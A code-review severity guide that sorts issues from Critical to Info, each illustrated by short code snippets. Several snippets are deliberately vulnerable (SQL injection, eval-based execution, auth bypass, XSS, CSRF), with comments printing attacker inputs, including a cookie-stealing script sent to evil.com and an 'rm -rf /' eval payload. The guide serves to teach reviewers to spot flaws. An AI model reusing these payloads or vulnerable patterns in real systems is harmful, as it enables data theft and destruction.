# Code Reviewer - Severity Guide

Severity assignment criteria with concrete code examples for each level.

---

## Severity Levels Overview

| Level | Priority | Action | Example Issues |
|-------|----------|--------|----------------|
| **Critical** | P0 | Fix immediately, block deploy | RCE, SQLi, auth bypass, prod secrets exposed |
| **High** | P1 | Fix before next release | XSS, CSRF, missing authz, data exposure, DoS |
| **Medium** | P2 | Fix in current sprint | Weak crypto, N+1 queries, race conditions, missing handlers |
| **Low** | P3 | Backlog | Dead code, naming, magic numbers, debug logs |
| **Info** | P4 | Consider | Suggestions, alternatives, style preferences |

---

## Critical (P0) — Fix Immediately, Block Deploy

**Criteria:** Exploitable by unauthenticated attacker → data breach, system compromise, or complete service outage.

### Example 1: SQL Injection in Login Form
```python
# CRITICAL: User input directly concatenated into SQL
username = request.form['username']
password = request.form['password']
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
cursor.execute(query)
# Attacker input: username = "admin' --"
```

### Example 2: Hardcoded Production AWS Credentials
```javascript
// CRITICAL: AWS credentials in source code
const AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE";
const AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";
// If this reaches a public repo, account is compromised
```

### Example 3: Authentication Bypass
```java
// CRITICAL: Authorization check can be bypassed by omitting header
@GetMapping("/admin/users")
public List<User> getUsers(@RequestHeader(value = "X-Admin", required = false) String admin) {
    if (admin != null && admin.equals("true")) {  // Attacker simply sends X-Admin: true
        return userRepository.findAll();
    }
}
```

### Example 4: Remote Code Execution
```python
# CRITICAL: Arbitrary code execution from user input
@app.route('/eval')
def evaluate():
    expr = request.args.get('expr')
    return str(eval(expr))  # Attacker: /eval?expr=__import__('os').system('rm -rf /')
```

### Example 5: Data Loss Bug
```go
// CRITICAL: Unconditional DELETE without transaction
func DeleteUser(db *sql.DB, userID string) error {
    _, err := db.Exec("DELETE FROM users WHERE id = $1", userID)  // No backup, no soft-delete
    return err
}
```

---

## High (P1) — Fix Before Next Release

**Criteria:** Exploitable under realistic conditions → significant data exposure, privilege escalation, or service degradation.

### Example 1: Reflected XSS
```javascript
// HIGH: User input rendered without sanitization
app.get('/search', (req, res) => {
    res.send(`<h1>Results for: ${req.query.q}</h1>`);  
    // Attacker: /search?q=<script>fetch('https://evil.com?c='+document.cookie)</script>
});
```

### Example 2: Missing Authorization Check
```python
# HIGH: Any authenticated user can access any order
@login_required
def order_detail(request, order_id):
    order = Order.objects.get(id=order_id)  # No ownership check
    return render(request, 'order.html', {'order': order})
    # User A can view User B's order by changing order_id
```

### Example 3: CSRF on State-Changing Endpoint
```javascript
// HIGH: No CSRF protection on POST
app.post('/api/transfer', (req, res) => {
    const { to, amount } = req.body;
    transfer(req.user.id, to, amount);  
    // Attacker's site can submit a hidden form to transfer funds
});
```

### Example 4: Sensitive Data Exposure in Logs
```go
// HIGH: PII logged in plaintext
log.Printf("User %s logged in with password: %s", username, password)
// Password appears in log files, sent to logging aggregator
```

### Example 5: DoS Vector — Unbounded Query
```python
# HIGH: No pagination — can return millions of rows
def list_users():
    users = User.objects.all()  # SELECT * FROM users without LIMIT
    return JsonResponse({'users': list(users.values())})
    # 10M users → OOM, DB connection exhaustion
```

---

## Medium (P2) — Fix in Current Sprint

**Criteria:** Degrades quality, security posture, or performance; unlikely to cause immediate incident.

### Example 1: Weak Cryptographic Algorithm
```javascript
// MEDIUM: MD5 for integrity check
const hash = crypto.createHash('md5').update(data).digest('hex');
// MD5 is collision-vulnerable; use SHA-256 or SHA-3
```

### Example 2: N+1 Query Problem
```python
# MEDIUM: N+1 queries — fetches related objects one-by-one
def get_orders_with_items():
    orders = Order.objects.all()
    result = []
    for order in orders:
        items = order.items.all()  # Separate query per order → 101 queries for 100 orders
        result.append({'order': order, 'items': items})
    return result
# Fix: Order.objects.prefetch_related('items').all()
```

### Example 3: Race Condition
```go
// MEDIUM: Check-then-act race condition
func TransferFunds(db *sql.DB, from, to string, amount int) error {
    var balance int
    db.QueryRow("SELECT balance FROM accounts WHERE id = $1", from).Scan(&balance)
    if balance >= amount {
        db.Exec("UPDATE accounts SET balance = balance - $1 WHERE id = $2", amount, from)
        db.Exec("UPDATE accounts SET balance = balance + $1 WHERE id = $2", amount, to)
    }
    // Two concurrent transfers can both pass the balance check
    // Fix: Use SELECT ... FOR UPDATE or UPDATE with WHERE balance >= amount
}
```

### Example 4: Missing Error Handling
```javascript
// MEDIUM: Unhandled promise rejection
async function processPayment(payment) {
    const result = await paymentGateway.charge(payment);  // If this throws, caller never knows
    await database.save(result);
}
// Fix: try/catch with proper error propagation or fallback
```

### Example 5: Unbounded Caching
```java
// MEDIUM: Cache with no eviction policy — memory leak
private final Map<String, User> userCache = new ConcurrentHashMap<>();

public User getUser(String id) {
    return userCache.computeIfAbsent(id, this::loadFromDb);  
    // Cache grows unbounded → eventually OOM
}
```

---

## Low (P3) — Backlog

**Criteria:** Code quality issue without immediate functional or security impact.

### Example 1: Dead Code
```python
# LOW: Unused function
def calculate_tax_v1(amount):
    return amount * 0.08  # V2 replaced this; remove when confirmed migration complete
```

### Example 2: Magic Numbers
```javascript
// LOW: Magic numbers without context
setTimeout(() => refreshData(), 300000);  // What is 300000? Use const REFRESH_INTERVAL_MS = 5 * 60 * 1000
```

### Example 3: Debug Logging Left in Production
```python
import logging
logging.basicConfig(level=logging.DEBUG)  # LOW: Debug level in production fills disks
```

### Example 4: Missing Type Hints
```python
# LOW: No type hints reduces IDE support and catches fewer bugs
def process_order(order, user, discount):  # Fix: def process_order(order: Order, user: User, discount: float) -> Receipt:
```

### Example 5: Inconsistent Naming
```java
// LOW: Inconsistent naming convention
public class user_service {  // Fix: UserService (PascalCase for classes)
    public void Get_User() { }  // Fix: getUser (camelCase for methods)
}
```

---

## Info (P4) — Consider

**Criteria:** Subjective improvements, alternative approaches, positive feedback.

### Example 1: Simpler Alternative
```javascript
// INFO: Consider using optional chaining
const city = user && user.address && user.address.city;  
// Suggestion: const city = user?.address?.city;
```

### Example 2: Positive Pattern Recognition
```python
# INFO: Great use of context manager — ensures clean resource cleanup
with open('data.json') as f:
    data = json.load(f)
```

### Example 3: Documentation Suggestion
```go
// INFO: Consider adding a doc comment for exported function
func CalculateRate(principal float64, term int) float64 {
    // Suggestion: Add // CalculateRate computes the annual percentage rate...
}
```

### Example 4: Test Coverage Gap
```python
# INFO: This edge case isn't covered by tests
def divide(a, b):
    return a / b  # Suggestion: Add test for b=0 case
```

---

## Decision Matrix

| Factor | Critical | High | Medium | Low |
|--------|----------|------|--------|-----|
| Data breach possible | ✓ | ✓ | — | — |
| Remote exploitation | ✓ | ✓ | — | — |
| No authentication required | ✓ | — | — | — |
| Affects all users | ✓ | — | — | — |
| Workaround exists | — | — | ✓ | ✓ |
| Requires unlikely conditions | — | — | ✓ | ✓ |
| Cosmetic only | — | — | — | ✓ |
